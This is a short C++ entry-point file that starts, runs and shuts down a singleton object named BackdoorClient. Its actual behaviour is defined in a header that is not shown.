#include "BackdoorClient/BackdoorClient.h"

int main(int argc, char* argv[])
{
    if (BackdoorClient::Inst()->Init(argc, argv))
    {
        BackdoorClient::Inst()->Run();
    }

    BackdoorClient::Inst()->Shutdown();

    return 0;
}
